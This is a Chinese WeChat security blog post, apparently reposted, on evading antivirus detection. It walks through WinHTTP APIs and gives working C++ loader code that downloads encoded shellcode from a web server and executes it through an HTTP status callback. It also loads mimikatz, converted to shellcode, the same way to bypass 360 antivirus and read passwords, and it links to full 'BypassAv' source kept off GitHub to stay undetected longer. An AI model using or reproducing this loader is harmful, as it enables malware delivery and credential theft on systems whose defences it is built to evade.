#  分享 | mimikatz和shellcode免杀

[ EchoSec ](javascript:void\(0\);)

**EchoSec** ![]()

微信号 gh_ae9ab8305da0

功能介绍 萌新专注于网络安全行业学习

____

___发表于_

收录于合集

![](https://gitee.com/fuli009/images/raw/master/public/20221005121451.png)

## 前置知识

1.Windows api

  1. VirtualProtect

    
    
    BOOL VirtualProtect(  
      [in]  LPVOID lpAddress,//要更改属性的地址  
      [in]  SIZE_T dwSize,//要更改属性的区域的大小  
      [in]  DWORD  flNewProtect,//这里填PAGE_EXECUTE_READWRITE即可  
      [out] PDWORD lpflOldProtect//接收原来的访问保护值  
    );  
    

例如：

    
    
    char buf[]="xxxx";  
    DWORD ppp;  
    VirtualProtect(&buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &ppp);  
    

  1. WinHttpOpen  
初始化winhttp函数的使用并返回winhttp会话句柄，如果失败，则返回值是NULL

https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpopen

    
    
    HINTERNET WinHttpOpen(  
      [in, optional] LPCWSTR pszAgentW,//名称，用作http协议中的用户代理，随便填几个单词就可以了  
      [in]           DWORD   dwAccessType,//访问类型，这里我们根据文档随便填个，这里我填的WINHTTP_ACCESS_TYPE_DEFAULT_PROXY  
      [in]           LPCWSTR pszProxyW,//第二个参数如果未设置为WINHTTP_ACCESS_TYPE_NAMED_PROXY，则填WINHTTP_NO_PROXY_NAME  
      [in]           LPCWSTR pszProxyBypassW,//第二个参数如果未设置为WINHTTP_ACCESS_TYPE_NAMED_PROXY，则填WINHTTP_NO_PROXY_BYPASS  
      [in]           DWORD   dwFlags//这里填啥都不影响，我们填个0  
    );  
    

例如：

    
    
    HINTERNET  hSession = NULL;  
    hSession = WinHttpOpen(L"UA", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);  
    if(HSession==NULL){  
        cout <<"WinHttpOpens失败";  
    }  
    else{  
        cout <<"成功";  
    }  
    

  1. WinHttpConnect  
指定http请求的初始目标服务器，函数成功则返回句柄，否则返回NULL  
https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpconnect

    
    
    HINTERNET WinHttpConnect(  
      [in] HINTERNET     hSession,//WinHttpOpen返回的句柄  
      [in] LPCWSTR       pswzServerName,//ip地址  
      [in] INTERNET_PORT nServerPort,//端口  
      [in] DWORD         dwReserved//这里必须填0  
    );  
    

例如：

    
    
    HINTERNET hConnect = WinHttpConnect(hSession, 127.0.0.1, 80, 0);  
    if(hConnect==NULL){  
        cout << "失败";  
    }else{  
        cout <<"成功";  
    }  
    

  1. WinHttpOpenRequest  
创建一个http请求句柄，函数成功返回一个句柄，否则为NULL  
https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpopenrequest

    
    
    HINTERNET WinHttpOpenRequest(  
      [in] HINTERNET hConnect,//WinHttpConnect返回的句柄  
      [in] LPCWSTR   pwszVerb,//填GET即可  
      [in] LPCWSTR   pwszObjectName,//要请求的文件名，例如index.php  
      [in] LPCWSTR   pwszVersion,//指向包含http版本的指针，填NULL即可  
      [in] LPCWSTR   pwszReferrer,//这里填WINHTTP_NO_REFERER  
      [in] LPCWSTR   *ppwszAcceptTypes,//这里填WINHTTP_DEFAULT_ACCEPT_TYPES  
      [in] DWORD     dwFlags//这里填个0就可以了  
    );  
      
    

例如：  
访问index.php

    
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"index.php", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);  
    if(hRequest==NULL){  
        cout <<"失败";  
    }  
    else{  
        cout <<"成功";  
    }  
    

  1. WinHttpSendRequest  
将制定的请求发送到http服务器，函数成功返回TRUE,失败返回FALSE  
https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpsendrequest

    
    
    BOOL WinHttpSendRequest(  
      [in]           HINTERNET hRequest,//WinHttpOpenRequest返回的句柄  
      [in, optional] LPCWSTR   lpszHeaders,//指向包含要加入的http头信息，我们不需要，填WINHTTP_NO_ADDITIONAL_HEADERS即可  
      [in]           DWORD     dwHeadersLength,//附加头的长度，我们没有添加请求头信息，所以填0  
      [in, optional] LPVOID    lpOptional,//要发送的数据，我们不需要，填WINHTTP_NO_REQUEST_DATA即可  
      [in]           DWORD     dwOptionalLength,//填0  
      [in]           DWORD     dwTotalLength,//填0  
      [in]           DWORD_PTR dwContext//填0  
    );  
    

例如：

    
    
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);  
    if(!bResult){  
        cout <<"失败";  
    }else{  
        cout <<"成功"  
    }  
    

  1. WinHttpReceiveResponse  
接收由WinHttpSendRequest函数发起的http请求的响应  
https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpreceiveresponse

    
    
    BOOL WinHttpReceiveResponse(  
      [in] HINTERNET hRequest,//WinHttpOpenRequest返回的句柄，需要在调用这个api前调用WinhttpSendRequest函数  
      [in] LPVOID    lpReserved//此值必须为NULL  
    );  
    

例如：

    
    
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);  
      
    if(!bResult){  
        cout <<"失败";  
        exit(1);  
    }  
    else{  
        bResults = WinHttpReceiveResponse(hRequest, NULL);  
        if(!bResult){  
            cout<<"失败";  
        }  
        else{  
            cout << "成功";  
        }  
    }  
      
    

  1. WinHttpQueryHeaders  
这个api可以获取http头的一些信息，比如cookie之类的 (使用这个api是因为我把shellcode放在了http头中)  
https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpqueryheaders

    
    
    BOOL WinHttpQueryHeaders(  
      [in]           HINTERNET hRequest,//WinHttpOpenRequest返回的句柄，需要在调用这个api前调用WinHttpReceiveResponse函数  
      [in]           DWORD     dwInfoLevel,  
      [in, optional] LPCWSTR   pwszName,  
      [out]          LPVOID    lpBuffer,  
      [in, out]      LPDWORD   lpdwBufferLength,  
      [in, out]      LPDWORD   lpdwIndex  
    );  
    

例如：  
以下代码即可获取cookie  
`bResults是前面调用WinHttpSendRequesth和WinHttpReceiveResponse后的布尔值`

    
    
    if (bResults){  
        bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);  
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)  
        {  
            lpOutBuffer = new WCHAR[dwSize / sizeof(WCHAR)];  
            bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CUSTOM, "cookie", lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX);  
            printf("%s",lpOutBuffer);  
        }  
    }  
    

想要获取其他http头信息，把第二个WinHttpQueryHeaders的第三个参数'cookie'改成对应的即可，例如获取Referer  
`bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CUSTOM, "Referer",
lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX);`

  1. WinHttpSetStatusCallback  
可以设置一个回调函数，我们使用它来加载我们的shellcode,当失败时返回WINHTTP_INVALID_STATUS_CALLBACK  
https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpsetstatuscallback

    
    
    WINHTTP_STATUS_CALLBACK WinHttpSetStatusCallback(  
      [in] HINTERNET       hInternet,//要设置回调的句柄，这里我们使用WinHttpOpen返回的句柄  
      [in] WINHTTP_STATUS_CALLBACK lpfnInternetCallback,//指向WINHTTP_STATUS_CALLBACK类型的回调函数的指针  
      [in] DWORD           dwNotificationFlags,//这里我们填WINHTTP_CALLBACK_FLAG_HANDLES，它的意思就是当我们调用WinHttpCloseHandle关闭句柄的时候，会调用回调函数，从而执行我们的shellcode  
      [in] DWORD_PTR       dwReserved//此值必须为NULL  
    );  
    

例如：

    
    
    char shellcode[]="xxxxxx";  
    DWORD ppp;  
    VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &ppp);  
      
    HINTERNET hopen = WinHttpOpen(L"User", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);  
      
    WINHTTP_STATUS_CALLBACK callback = WinHttpSetStatusCallback(hopen, (WINHTTP_STATUS_CALLBACK)&shellcode, WINHTTP_CALLBACK_FLAG_HANDLES, NULL);  
      
    if (callback == WINHTTP_INVALID_STATUS_CALLBACK) {  
        cout << "[*] WinHttpSetStatusCallback失败" << endl;  
        return -1;  
    }；  
      
    cout << "[*] WinHttpSetStatusCallback 成功" << endl;  
    WinHttpCloseHandle(hopen);   
    //因为设置了WINHTTP_CALLBACK_FLAG_HANDLES，所以当我们调用WinHttpCloseHandle关闭句柄的时候会执行我们的shellcode  
    

![](https://gitee.com/fuli009/images/raw/master/public/20221005121452.png)  
以下两个api是加载mimikatz的时候用的

  1. WinHttpQueryDataAvailable  
这个函数返回可用WinHttpReadData读取的数据量，函数成功返回TRUE，失败返回FALSE  
https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpquerydataavailable

    
    
    BOOL WinHttpQueryDataAvailable(  
      [in]  HINTERNET hRequest,//WinhttpOpenRequest返回的句柄，需要在调用这个api前调用WinHttpReceiveResponse函数  
      [out] LPDWORD   lpdwNumberOfBytesAvailable//指向接收字节数的指针  
    );  
    

例如：  
`hConnect是之前WinHttpConnect返回的句柄`

    
    
    DWORD dwSize=0;  
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"index.php", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);  
    if(hRequest==NULL){  
        cout <<"WinHttpOpenRequest失败";  
        exit(1);  
    }  
      
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);  
      
    if(!bResult){  
        cout <<"WinHttpSendRequest失败";  
        exit(1);  
    }  
    bResults = WinHttpReceiveResponse(hRequest, NULL);  
      
    if(!bResult){  
        cout<<"WinHttpReceiveResponse失败";  
        exit(1);  
    }  
      
    if (!WinHttpQueryDataAvailable(hRequest, &dwSize)){  
       cout <<"失败" ;  
       exit(1);  
    }  
    else{  
        cout"成功"<<endl;  
        cout << "大小 :"<< dwSize <<endl;  
    }  
      
    

  1. WinHttpReadData  
就是读取文件数据，函数成功返回TRUE，失败返回FALSE  
https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-
winhttpreaddata

    
    
    BOOL WinHttpReadData(  
      [in]  HINTERNET hRequest,//WinhttpOpenRequest返回的句柄,需要在调用这个api前调用WinHttpQueryDataAvailable  
      [out] LPVOID    lpBuffer,//指向接收读取的数据的指针  
      [in]  DWORD     dwNumberOfBytesToRead,//要读取多少数据，这个值就是填写我们WinHttpQueryDataAvailable获取到的dwSize  
      [out] LPDWORD   lpdwNumberOfBytesRead//指向接收读取的字节数的指针  
    );  
    

例如：

    
    
    DWORD dwDownloaded=0;  
    char* pszOutBuffer=new char[dwSize];  
    if(!WinHttpReadData(hRequest, pszOutBuffer,dwSize,&dwDownloaded))){  
        cout <<"读取失败";  
        exit(1);  
    }  
    cout << pszOutBuffer <<endl;  
    

这两个api就相当于python爬虫读取数据一样，我们也可以把shellcode放进shellcode.txt里，在放到网站上，利用这两个api读取，最后回调函数执行

## shellcode免杀上线

效果如下  
![](https://gitee.com/fuli009/images/raw/master/public/20221005121453.png)

![](https://gitee.com/fuli009/images/raw/master/public/20221005121454.png)

shellcode加密解密：  
这里依然是沿用我上一篇文章加密解密方式，师傅们可以去看看我上一篇文章,地址https://forum.butian.net/share/1848  
这里我不在说了

shellcode加载  
这里用上面讲的WinHttpSetStatusCallback这个api

加密代码：  
encode.py

    
    
    shellcode = b""  
    str_=""  
    for i in shellcode:  
        code=(i^1024)+1024  
        str_+=str(code)  
    with open("ii.php","w") as f:  
        f.write(f'<?php header("sc:{str_}");?>')  
    print("ok")  
      
    

运行后会生成一个ii.php文件

    
    
    <?php header("sc:加密后的shellcode");?>  
    

解密和shellcode加载代码：

    
    
    DWORD LoadSc(char* EncodeBuffer) {  
        char buf[6000];  
        strcpy(buf, EncodeBuffer);  
        delete[] EncodeBuffer;  
        char cd[10];  
        char code;  
        string buf_2 = buf;  
        int num = 0,cnum = 0;  
        int num_ = num + 4;  
        for (int i = 0; i < sizeof(buf); i++) {  
            if (buf[i] != (char)'\x0') {  
                string str = buf_2.substr(num, num_);  
                if (str.length() < 4) {  
                    break;  
                }  
                str.copy(cd, 4, 0);  
                code = (char)(atoi(cd) - 1024) ^ 1024;  
                buf[cnum] = code;  
                cnum++;  
                num_ += 4;  
                num += 4;  
            }  
            else {  
                break;  
            }  
        }  
        DWORD Old = 0;  
        BOOL IsExchange = VirtualProtect(&buf, 6000, PAGE_EXECUTE_READWRITE, &Old);  
        if (!IsExchange) {  
            cout << "[*] VirtualProtect Error " << endl;  
            return -1;  
        }  
        cout << "[*] VirtualProtect Success" << endl;  
        HINTERNET hopen = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);  
        WINHTTP_STATUS_CALLBACK callback = WinHttpSetStatusCallback(hopen, (WINHTTP_STATUS_CALLBACK)&buf, WINHTTP_CALLBACK_FLAG_HANDLES, NULL);  
        if (callback == WINHTTP_INVALID_STATUS_CALLBACK) {  
            cout << "[*] WinHttpSetStatusCallback Error" << endl;  
            return -1;  
        }  
        cout << "[*] WinHttpSetStatusCallback Success" << endl;  
        cout << "[*] Load Success  " << endl << endl;  
        WinHttpCloseHandle(hopen);   
            return 1;  
    }  
    

获取shellcode：

我们先搭建一个网站,然后我们把生成的ii.php文件放在网站根目录下

在Winhttpconnect里填写网站对应的ip，端口，在WinHttpOpenRequest里填写对应要访问的php文件  
( WinHttpOpenRequest的第三个参数就是要访问的文件名 )  
（我是本地用phpstudy搭建的，所以ip为127.0.0.1，端口是80，文件名是生成的ii.php）

    
    
    HINTERNET hSession = WinHttpOpen(L"User", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);  
    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 80, 0);  
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"ii.php", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);  
    

随后调用WinHttpSendRequest和WinHttpReceiveResponse

    
    
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);  
    bResults = WinHttpReceiveResponse(hRequest, NULL);  
    

最后我们用WinHttpQueryHeaders获取sc这个请求头的数据，最后解密加载即可

    
    
    if (bResults){ //bResults是调用WinHttpSendRequesth和WinHttpReceiveResponse后的布尔值  
        bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);  
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)  
        {  
            lpOutBuffer = new CHAR[dwSize / sizeof(CHAR)];  
            bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CUSTOM, "sc", lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX);  
      
            LoadSc(lpOutBuffer);//这个函数定义在上面  
        }  
    }  
    

成功上线  
![](https://gitee.com/fuli009/images/raw/master/public/20221005121455.png)

## 免杀加载mimikatz

mimikatz本身是我是没有做任何免杀的

效果如下

![](https://gitee.com/fuli009/images/raw/master/public/20221005121456.png)

![](https://gitee.com/fuli009/images/raw/master/public/20221005121458.png)  
不过因为存在杀软的原因，所以还是无法读取密码,不过至少达到我们加载mimikatz的目的了

![](https://gitee.com/fuli009/images/raw/master/public/20221005121459.png)

实现如下 ：

这里我们需要用到github上的一个项目,这是地址https://github.com/hasherezade/pe\\_to\\_shellcode

我们需要用到里面的pe2shc.exe这个文件，它可以把exe文件变成shellcode  
`pe2shc.exe mimikatz文件 mimimi.txt`  
随后会生成一个mimimi.txt文件，我们把它放在我们的网站根目录下

读取mimimi.txt  
这里使用WinHttpQueryDataAvailable获取数据大小然后使用WinHttpReadData来读取数据，最后利用WinHttpSetStatusCallback设置回调函数执行

在Winhttpconnect里填写网站对应的ip，端口，在WinHttpOpenRequest里填写对应要访问的文件(我这里是刚才生成的mimimi.txt)

    
    
    HINTERNET hSession = WinHttpOpen(L"User", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);  
    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 80, 0);  
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"mimimi.txt", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);  
    

随后调用WinHttpSendRequest和WinHttpReceiveResponse

    
    
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);  
    bResults = WinHttpReceiveResponse(hRequest, NULL);  
    

最后WinHttpReadDat读取，设置回调函数执行

    
    
    DWORD dwSize = 0;  
    //hRequest是之前WinHttpOpenRequest返回的句柄  
    if (!WinHttpQueryDataAvailable(hRequest, &dwSize))  
    {  
            printf("Error %u in WinHttpQueryDataAvailable.\n",  
                    GetLastError());  
            break;  
    }  
    if (!dwSize)  
            break;  
    dwSize = dwSize * 4000;  
    //这里我乘以4000是因为获取的大小老是小于mimimi.txt文件的大小，所以我直接干脆乘以4000，以防万一  
      
    char* pszOutBuffer = new char[dwSize];  
      
    ZeroMemory(pszOutBuffer, dwSize);  
      
    if (!WinHttpReadData(hRequest, pszOutBuffer,dwSize, &dwDownloaded))  
    {  
            printf("Error %u in WinHttpReadData.\n", GetLastError());  
    }  
    else  
    {  
            cout << "[*] Loading" << endl << endl;  
      
            DWORD ppp;  
            VirtualProtect(pszOutBuffer, dwSize, PAGE_EXECUTE_READWRITE, &ppp);  
            HINTERNET hopen = WinHttpOpen(L"User", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);  
            WINHTTP_STATUS_CALLBACK callback = WinHttpSetStatusCallback(hopen, (WINHTTP_STATUS_CALLBACK)pszOutBuffer, WINHTTP_CALLBACK_FLAG_HANDLES, NULL);  
            if (callback == WINHTTP_INVALID_STATUS_CALLBACK) {  
                    cout << "[*] WinHttpSetStatusCallback Error" << endl;  
                    exit(1);  
            }  
      
            cout << "[*] Load Success  " << endl << endl;  
            WinHttpCloseHandle(hopen);  
    }  
    

这里我把杀软关了，所以可以正常读取密码

![](https://gitee.com/fuli009/images/raw/master/public/20221005121500.png)

同理，使用这种方法，应该可以免杀一些exe文件了，这个师傅们可以自己试一下，毕竟mimikatz本身没有做任何处理都能绕过360加载了

## 完整代码

为了师傅们多玩会，暂时就不放github了，这样有效时间久点，我放在了阿里云上

「BypassAv」https://www.aliyundrive.com/s/4fYTr7yXdkU 提取码: l7pg  
点击链接保存，或者复制本段内容，打开「阿里云盘」APP ，无需下载极速在线查看，视频原画倍速播放。

源码中的ip地址，端口这类的师傅们在使用的时候记得更改，都在wmain函数下

本文转载自奇安信，更多内容请点击“阅读原文”

>精彩回顾<  
 ****

[干货 |
红队快速批量打点的利器](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484374&idx=1&sn=f98119b165319ea399cf3252e5976532&chksm=fcdf5fc9cba8d6df1080aa1d8e86c67bb873bcd40139293f8f63279c2df44946023ed6460cb5&scene=21#wechat_redirect)  

[【干货】最全的Tomcat漏洞复现](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484175&idx=1&sn=89771c538a529efd108d4a676c093ea7&chksm=fcdf5f10cba8d606f3c2a635b0bb94da11e8978dba2ac4ed9e4debab7a7401ecc8a0f43777b6&scene=21#wechat_redirect)

[{Vulhub漏洞复现（一）ActiveMQ}](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484055&idx=1&sn=6b71d21065a832cac662dfbd18b9ea09&chksm=fcdf5e88cba8d79ec80b97aadcbe13aef9f4857267018daed4760a582a53d46bb3d3a5f67831&scene=21#wechat_redirect)

[{Vulhub漏洞复现（二） Apereo
CAS}](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484107&idx=1&sn=9467ffe0e276a521f6be0f170941f70d&chksm=fcdf5ed4cba8d7c2d72f3f30a911aa447246bd007f3b647942129d15a2298a3aa494558d4c1c&scene=21#wechat_redirect)

[Cobalt
Strike免杀脚本生成器|cna脚本|bypassAV](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484070&idx=1&sn=d0b1b7bd8687c452ccfa10d11218985e&chksm=fcdf5eb9cba8d7af7059dd9d0de041c2ef5eb7b4986d59fac34f62f5e4b705c42aea4018c318&scene=21#wechat_redirect)

[xss bypass备忘单|xss绕过防火墙技巧|xss绕过WAF的方法  
](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484076&idx=1&sn=6af2e134ac579e48697f2ee6b7279a4e&chksm=fcdf5eb3cba8d7a5f545a558c13e184c82bf1bb0dd281a4d7ade4e11fa1e647ac447322fe8af&scene=21#wechat_redirect)

[【贼详细 | 附PoC工具】Apache HTTPd最新RCE漏洞复现  
](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484184&idx=1&sn=f9286573a97bd404e43622c0235aa357&chksm=fcdf5f07cba8d611dc7d8c479b47e312b95194ec5634c6fe46867719bea8de051681dd777558&scene=21#wechat_redirect)

[干货 |
横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484308&idx=1&sn=dffaf96b424952c365fd22f733f696f7&chksm=fcdf5f8bcba8d69d58ebaa0da04fbc2b4bf236df6e763d3da4addc097b559f71edfb48ae9712&scene=21#wechat_redirect)

[干货 |
免杀ShellCode加载框架](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484268&idx=1&sn=cbbcf96a16f4115a277f7b178f58fbfd&chksm=fcdf5f73cba8d6654a8da5bc3c00a6c2997263869f74e7be9316bbc6e4e527e317e999539d4b&scene=21#wechat_redirect)

[【干货】phpMyAdmin漏洞利用汇总](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484271&idx=1&sn=b07fd5a4b7a0d2430281e76c30cbb4eb&chksm=fcdf5f70cba8d6665a709a2da2bb4ea15751777d3a81818a19d52fe4b5a8306c756f0995bda5&scene=21#wechat_redirect)

[【神兵利器 |
附下载】一个用于隐藏C2的、开箱即用的Tools](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485199&idx=1&sn=43cd48cf100da8da5f7b750274219123&chksm=fcdf5b10cba8d206d9353ad5009caa882960fb3e09af61e26bc88dafa67ae71b8a7b21ba4f38&scene=21#wechat_redirect)  

[分享 |
个人渗透技巧汇总（避坑）笔记](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485185&idx=1&sn=a839927c1623655300d93d861bf6e1ad&chksm=fcdf5b1ecba8d2083c582706465f6c5c50e36dcba98853b270350d70c0bc4aa057170fda4d31&scene=21#wechat_redirect)  

![]()

关注我

获得更多精彩

![](https://gitee.com/fuli009/images/raw/master/public/20221005121501.png)

  

 **坚持学习与分享！走过路过点个"** _ **在看**_
**"，不会错过**![](https://gitee.com/fuli009/images/raw/master/public/20221005121502.png)

 ** _仅用于学习交流，不得用于非法用途_**

 _ **如侵权请私聊公众号删文**_

![](https://gitee.com/fuli009/images/raw/master/public/20221005121503.png)

 **EchoSec**

萌新专注于网络安全行业学习

10篇原创内容

公众号

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

